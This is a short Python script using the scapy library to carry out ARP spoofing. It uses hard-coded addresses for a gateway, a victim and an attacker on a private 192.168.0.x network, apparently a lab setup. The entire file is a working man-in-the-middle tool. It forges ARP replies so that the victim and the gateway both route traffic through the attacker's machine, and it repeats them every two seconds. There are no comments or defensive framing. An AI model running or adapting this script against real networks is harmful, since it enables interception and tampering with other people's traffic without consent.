from scapy.all import *
import time

gateway_ip = "192.168.0.1"
gateway_mac = "b0:19:21:fb:0a:a4"

victim_ip = "192.168.0.104"
victim_mac = "08:00:27:54:56:fb"

attacker_mac = "08:00:27:57:11:98"

poison_victim = Ether(dst=victim_mac)/ARP(op = 2, psrc=gateway_ip, pdst=victim_ip, hwsrc=attacker_mac, hwdst=victim_mac) 

poison_gateway = Ether(dst=gateway_mac)/ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwsrc=attacker_mac, hwdst=gateway_mac)

try:
	while True:
		sendp(poison_victim, verbose=0)
		sendp(poison_gateway, verbose=0)
		print("[+] ARP mappings refreshed")
		time.sleep(2)
except KeyboardInterrupt:
	print("\n[!]Stopped")
